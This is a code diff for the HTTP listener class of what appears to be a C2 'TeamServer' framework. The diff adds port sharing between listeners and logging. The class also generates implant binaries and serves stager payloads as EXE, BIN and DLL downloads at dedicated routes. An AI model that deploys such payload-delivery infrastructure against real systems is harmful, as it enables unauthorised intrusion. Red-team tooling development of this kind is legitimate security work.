@@ -2,17 +2,21 @@
 using Microsoft.AspNetCore.Hosting;
 using Microsoft.Extensions.DependencyInjection;
 using Microsoft.Extensions.Hosting;
+using Microsoft.Extensions.Logging;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Threading;
 using System.Threading.Tasks;
+using TeamServer.Services;
 
 namespace TeamServer.Models
 {
     public class HttpListener : Listener
     {
+        public static Dictionary<int, List<HttpListener>> ListenersByPorts = new Dictionary<int, List<HttpListener>>();
+
         public override string Protocol => this.Secured ? "https" : "http";
 
         public override string Uri => $"{this.Protocol}://{this.Ip}:{this.PublicPort}".ToLower();
@@ -26,7 +30,38 @@ namespace TeamServer.Models
 
         public override async Task Start()
         {
+            if(_logger != null)
+            {
+                _logger.LogInformation($"Starting HTTP Listener {this.Name} : {this.Protocol}://{this.Ip}:{this.PublicPort} => {this.BindPort}");
+            }
 
+            var port = this.BindPort;
+            bool shouldStart = false;
+            if (ListenersByPorts.ContainsKey(port))
+            {
+                var list = ListenersByPorts[port];
+                if (list.Count == 0)
+                    shouldStart = true;
+                list.Add(this);
+
+            }
+            else
+            {
+                ListenersByPorts.Add(port, new List<HttpListener>() { this });
+                shouldStart = true;
+            }
+
+            if (_logger != null)
+            {
+                _logger.LogInformation($"Creating binairies");
+                var result = _binMakerService.GenerateBin(this);
+                if(_logger != null)
+                    _logger.LogInformation(result);
+                _binMakerService.GenerateB64(this);
+            }
+
+            if (!shouldStart)
+                return;
 
             var hostBuilder = new HostBuilder()
                 .ConfigureWebHostDefaults(host =>
@@ -81,13 +116,20 @@ namespace TeamServer.Models
                 e.MapControllerRoute("StagerExe", "/StagerExe", new { Controller = "HttpListener", Action = "DownloadStagerExe" });
                 e.MapControllerRoute("StagerBin", "/StagerBin", new { Controller = "HttpListener", Action = "DownloadStagerBin" });
                 e.MapControllerRoute("StagerDll", "/StagerDll", new { Controller = "HttpListener", Action = "DownloadStagerDll" });
-                
+
             });
         }
 
         public override void Stop()
         {
-            _tokenSource.Cancel();
+            var port = this.BindPort;
+
+            var list = ListenersByPorts[port];
+            list.Remove(this);
+
+
+            if (list.Count == 0)
+                _tokenSource.Cancel();
         }
     }
 }
